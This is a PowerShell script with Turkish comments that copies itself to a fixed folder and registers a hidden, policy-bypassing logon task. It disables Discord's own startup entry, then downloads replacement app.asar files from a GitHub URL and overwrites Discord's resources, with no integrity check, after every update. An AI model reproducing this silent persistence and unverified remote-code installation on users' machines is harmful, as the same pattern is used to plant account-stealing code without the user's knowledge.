# DiscordPatcher.ps1
# İlk çalıştırmada kendini C:\Tools\DiscordPatcher.ps1 konumuna kopyalar,
# göreve o sabit yolu ekler. $PSCommandPath'e güvenmez, path hep sabittir.

$ErrorActionPreference = "SilentlyContinue"

# ===================== AYARLAR =====================
$BaseUrl      = "https://raw.githubusercontent.com/ardayimben/autoupdatebullshit/main"
$Files        = @("app.asar", "_app.asar")
$TaskName     = "DiscordPatcher"
$DiscordRoot  = "$env:LOCALAPPDATA\Discord"
$UpdateExe    = "$DiscordRoot\Update.exe"
$WatchSeconds = 120

$InstallDir  = "C:\Tools"
$InstallPath = Join-Path $InstallDir "DiscordPatcher.ps1"
# ===================================================

# --- 0) Kendini sabit konuma kur (ilk çalıştırmada) ---
if (-not (Test-Path $InstallDir)) {
    New-Item $InstallDir -ItemType Directory -Force | Out-Null
}

$runningFrom = $MyInvocation.MyCommand.Path   # şu an çalışan dosyanın yolu (varsa)

if ($runningFrom -and ($runningFrom -ne $InstallPath)) {
    # Başka bir yerden çalıştırıldı -> kendini kopyala, kopyayı başlat, kendini kapat
    Copy-Item -Path $runningFrom -Destination $InstallPath -Force
    Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
    exit
}

if (-not (Test-Path $InstallPath)) {
    # Hiç dosya yok (ör. kod yapıştırılarak -Command ile çalıştırıldı) -> kendi içeriğini yaz
    $selfContent = $MyInvocation.MyCommand.ScriptContents
    if ($selfContent) {
        Set-Content -Path $InstallPath -Value $selfContent -Encoding UTF8
    }
}

# Bundan sonrası hep $InstallPath üzerinden ilerler
$ScriptPath = $InstallPath

# --- 1) Discord'un startup kaydını kapat ---
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (Get-ItemProperty -Path $runKey -Name "Discord") {
    Remove-ItemProperty -Path $runKey -Name "Discord"
}
$approvedKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
if (Get-ItemProperty -Path $approvedKey -Name "Discord") {
    $disabled = [byte[]](3,0,0,0,0,0,0,0,0,0,0,0)
    Set-ItemProperty -Path $approvedKey -Name "Discord" -Value $disabled -Type Binary
}

# --- 2) Görev yoksa veya yanlış yolu gösteriyorsa yeniden kaydet ---
$task = Get-ScheduledTask -TaskName $TaskName
if ($task -and ($task.Actions[0].Arguments -notlike "*$ScriptPath*")) {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    $task = $null
}

if (-not $task) {
    $user      = "$env:USERDOMAIN\$env:USERNAME"
    $action    = New-ScheduledTaskAction -Execute "powershell.exe" `
                 -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
    $trigger   = New-ScheduledTaskTrigger -AtLogOn -User $user
    $principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Limited
    $settings  = New-ScheduledTaskSettingsSet -Priority 4 -AllowStartIfOnBatteries `
                 -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
    Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
                           -Principal $principal -Settings $settings | Out-Null
}

# --- Yardımcı fonksiyonlar ---
function Get-LatestApp {
    Get-ChildItem $DiscordRoot -Directory -Filter "app-*" |
        Sort-Object { [version]($_.Name -replace '^app-','') } |
        Select-Object -Last 1
}

function Stop-Discord {
    Get-Process Discord | Stop-Process -Force
    Start-Sleep -Milliseconds 800
}

function Get-AllFiles {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $dir = Join-Path $env:TEMP "discord_patch"
    Remove-Item $dir -Recurse -Force
    New-Item $dir -ItemType Directory -Force | Out-Null

    foreach ($f in $Files) {
        $out = Join-Path $dir $f
        $ok  = $false
        for ($i = 0; $i -lt 15 -and -not $ok; $i++) {
            Remove-Item $out -Force
            Invoke-WebRequest -Uri "$BaseUrl/$f" -OutFile $out -UseBasicParsing
            if ((Test-Path $out) -and (Get-Item $out).Length -gt 0) { $ok = $true }
            else { Start-Sleep -Seconds 2 }
        }
        if (-not $ok) { return $null }
    }
    return $dir
}

function Install-Files($appDir, $srcDir) {
    $resources = Join-Path $appDir.FullName "resources"

    $same = $true
    foreach ($f in $Files) {
        $t = Join-Path $resources $f
        $s = Join-Path $srcDir $f
        if (-not (Test-Path $t) -or (Get-FileHash $t).Hash -ne (Get-FileHash $s).Hash) { $same = $false; break }
    }
    if ($same) { return $false }

    Stop-Discord
    foreach ($f in $Files) {
        $t = Join-Path $resources $f
        Remove-Item $t -Force
        Copy-Item (Join-Path $srcDir $f) $t -Force
    }
    return $true
}

# --- 3) Dosyaları indir ve değiştir ---
$src = Get-AllFiles
$app = Get-LatestApp

if ($src -and $app) {
    Install-Files $app $src | Out-Null
}

# --- 4) Discord'u aç ---
if (-not (Get-Process Discord)) {
    Start-Process $UpdateExe -ArgumentList "--processStart", "Discord.exe"
}

# --- 5) Discord güncellenip yeni app-* klasörü oluşturursa tekrar yamala ---
if ($src -and $app) {
    $patchedName = $app.Name
    $deadline    = (Get-Date).AddSeconds($WatchSeconds)

    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds 3
        $latest = Get-LatestApp
        if ($latest -and $latest.Name -ne $patchedName) {
            $asarPath = Join-Path $latest.FullName "resources\app.asar"
            for ($i = 0; $i -lt 20 -and -not (Test-Path $asarPath); $i++) { Start-Sleep -Seconds 1 }
            Start-Sleep -Seconds 5

            if (Install-Files $latest $src) {
                Start-Process $UpdateExe -ArgumentList "--processStart", "Discord.exe"
            }
            $patchedName = $latest.Name
        }
    }
}

Remove-Item $src -Recurse -Force
